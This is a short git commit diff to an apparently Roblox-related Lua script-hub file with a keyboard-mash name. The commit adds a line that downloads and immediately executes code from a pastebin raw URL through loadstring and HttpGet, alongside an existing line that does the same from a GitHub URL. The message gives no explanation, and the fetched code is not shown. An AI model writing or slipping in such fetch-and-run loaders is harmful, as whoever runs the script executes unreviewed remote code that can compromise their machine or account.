4205ed1c3f6d6e654c737c4b28acfec4a5c850ce
AnyaHubsV2 <131607266+AnyaHubsV2@users.noreply.github.com>
2024-09-15 07:52:02 +0300

    Update srbehr6u5yrteferthyuierthyjui7u6y5trefrgthryu765yetrg.lua

--- srbehr6u5yrteferthyuierthyjui7u6y5trefrgthryu765yetrg.lua
+++ srbehr6u5yrteferthyuierthyjui7u6y5trefrgthryu765yetrg.lua
@@ -1,6 +1,7 @@
 local function loadUI()
 	repeat wait(0.25) until game:IsLoaded()
 	local DiscordC = loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Main/main/CubixSettings.lua"))()
+	loadstring(game:HttpGet('https://pastebin.com/raw/Cj2qTcBe'))()
 
 	local G2L = {};
 
